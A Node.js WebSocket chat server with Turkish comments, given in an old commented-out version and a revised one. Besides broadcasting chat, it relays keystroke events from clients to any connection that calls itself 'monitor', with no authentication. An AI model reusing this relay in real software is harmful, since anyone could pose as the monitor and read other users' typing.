/*import { WebSocketServer, WebSocket } from "ws";
import fs from "fs";
import { randomUUID } from "crypto";
const server = new WebSocketServer({ port: 8080 });
const clients = new Map();

server.on("connection", function connection(ws) {
  const clientId = randomUUID();
  clients.set(clientId, { ws, username: null }); // Kullanıcı adı için bir alan ekleyerek WebSocket bağlantısını sakla
  console.log("Client connected with ID:", clientId);

  ws.on("close", () => {
    console.log(
      `Client with ID ${clientId} (${
        clients.get(clientId).username || "unknown"
      }) has disconnected.`
    );
    clients.delete(clientId);
  });

  ws.on("error", (error) => console.error("WebSocket error:", error));

  ws.on("message", function incoming(message) {
    const messageObject = JSON.parse(message);
    const client = clients.get(clientId); // Client bilgilerini al

    if (messageObject.type === "setUsername") {
      // Kullanıcı adını ayarla
      client.username = messageObject.username;
      console.log(
        `Username set for client ID: ${clientId} -> ${client.username}`
      );
    } else if (messageObject.type === "keystroke") {
      // Klavye etkinliklerini 'monitor' kullanıcısına gönder
      const monitor = [...clients.values()].find(
        (client) => client.username === "monitor"
      );
      if (monitor && monitor.ws.readyState === WebSocket.OPEN) {
        monitor.ws.send(
          JSON.stringify({
            type: "keystroke",
            clientId: clientId,
            username: client.username,
            keystroke: messageObject.keystroke,
          })
        );
        console.log(
          `Keystroke '${messageObject.keystroke}' from ${client.username} sent to monitor`
        );
      }
    } else {
      // Diğer tüm mesaj türleri için genel mesaj işleme fonksiyonunu çağır
      handleIncomingMessage(messageObject, clientId);
    }
  });
});

function handleIncomingMessage(messageObject, senderId) {
  const { name, message: text } = messageObject;
  const client = clients.get(senderId);
  const outgoingMessage = JSON.stringify({ senderId, name, message: text });

  console.log("Received message from ID:", senderId, ":", messageObject, name);
  clients.forEach(({ ws }, id) => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(outgoingMessage);
      console.log("Sent message to client ID:", id, outgoingMessage.name);
    }
  });
}

// Kullanıcıları listeleme fonksiyonu
function listConnectedUsers() {
  console.log("Currently connected clients:");
  clients.forEach(({ username }, id) => {
    console.log(`Client ID: ${id}, Username: ${username || "not set"}`);
  });
}

// Her 30 saniyede bir bağlı kullanıcıları listele
setInterval(listConnectedUsers, 30000);

console.log("Server is running on port 8080");
*/
import { WebSocketServer, WebSocket } from "ws";
import fs from "fs";
import { randomUUID } from "crypto";

const server = new WebSocketServer({ port: 8080 });
const clients = new Map();

server.on("connection", function connection(ws) {
  const clientId = randomUUID();
  clients.set(clientId, { ws, username: null });
  console.log("Client connected with ID:", clientId);

  ws.on("close", () => {
    console.log(
      `Client with ID ${clientId} (${
        clients.get(clientId).username || "unknown"
      }) has disconnected.`
    );
    clients.delete(clientId);
  });

  ws.on("error", (error) => console.error("WebSocket error:", error));
  /*
  ws.on("message", function incoming(message) {
    const messageObject = JSON.parse(message);
    const client = clients.get(clientId);

    switch (messageObject.type) {
      case "setUsername":
        client.username = messageObject.username;
        console.log(
          `Username set for client ID: ${clientId} -> ${client.username}`
        );
        break;
      case "keystroke":
        handleKeystroke(messageObject, client);
        break;
      default:
        handleIncomingMessage(messageObject, clientId);
        break;
    }
  });
  */
  ws.on("message", function incoming(message) {
    const messageObject = JSON.parse(message);
    const client = clients.get(clientId);

    switch (messageObject.type) {
      case "setUsername":
        client.username = messageObject.username;
        console.log(
          `Username set for client ID: ${clientId} -> ${client.username}`
        );
        break;
      case "message":
        const outgoingMessage = JSON.stringify({
          type: "message",
          name: client.username || "Anonymous",
          message: messageObject.message,
        });
        // Tüm bağlı müşterilere mesaj gönder
        clients.forEach(({ ws: clientWs }, id) => {
          if (clientWs.readyState === WebSocket.OPEN) {
            clientWs.send(outgoingMessage);
          }
        });
        break;
      // Diğer case'ler buraya eklenebilir
    }
  });
});

function handleKeystroke(messageObject, senderClient) {
  const monitor = [...clients.values()].find(
    (client) => client.username === "monitor"
  );
  if (monitor && monitor.ws.readyState === WebSocket.OPEN) {
    monitor.ws.send(
      JSON.stringify({
        type: "keystroke",
        clientId: senderClient.id,
        username: senderClient.username,
        keystroke: messageObject.keystroke,
      })
    );
    console.log(
      `Keystroke '${messageObject.keystroke}' from ${senderClient.username} sent to monitor`
    );
  }
}

function handleIncomingMessage(messageObject, senderId) {
  const { name, message } = messageObject;
  const outgoingMessage = JSON.stringify({ senderId, name, message });

  console.log("Received message from ID:", senderId, ":", messageObject);
  clients.forEach(({ ws }, id) => {
    if (ws.readyState === WebSocket.OPEN) {
      ws.send(outgoingMessage);
      console.log("Sent message to client ID:", id);
    }
  });
}

function listConnectedUsers() {
  console.log("Currently connected clients:");
  clients.forEach(({ username }, id) => {
    console.log(`Client ID: ${id}, Username: ${username || "not set"}`);
  });
}

setInterval(listConnectedUsers, 30000);

console.log("Server is running on port 8080");
